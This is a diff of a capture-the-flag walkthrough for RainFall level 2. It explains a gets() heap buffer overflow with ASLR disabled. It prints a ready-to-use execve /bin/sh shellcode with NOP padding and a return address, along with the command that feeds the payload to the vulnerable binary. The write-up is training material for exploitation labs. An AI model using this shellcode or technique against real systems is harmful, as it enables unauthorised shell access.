@@ -2,12 +2,12 @@ As for the previous level, we have a call to gets which is vulnerable to buffer 
 
 !!! PRÉCISER CE POINT !!!
 
-The address space layout randomization (ASLR) is off, meaning the memory addresses associated with running processes are predictable.
+The address space layout randomization (ASLR) is off, meaning the memory addresses associated with running processes are predictable:
 ```
 level2@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
 0
 ```
-With ltrace, we get the address of our input registered on the heap (0x0804a008):
+So, we get the address of our input registered on the heap (0x0804a008) using ltrace:
 ```
 level2@RainFall:~$ ltrace ./level2 
 __libc_start_main(0x804853f, 1, 0xbffff7d4, 0x8048550, 0x80485c0 <unfinished ...>
@@ -32,9 +32,11 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [this one](https://github.com/maxisimo/42-RainFall/blob/main/level2/walkthrough.md) corresponds to what we want to do. It is 21 bytes long so we need to complete our input with 59 '\x90' bytes (the 'No Operation' instruction), followed by the address of our shellcode on the heap, in the little endian convention:
-`level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x90' * 59 + '\x08\xa0\x04\x08'" > /tmp/exploit`
+```
+level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x90' * 59 + '\x08\xa0\x04\x08'" > /tmp/exploit
+```
 
-
+We just have to launch the program by passing our crafted input:
 ```
 level2@RainFall:~$ cat /tmp/exploit - | ./level2 
 1���
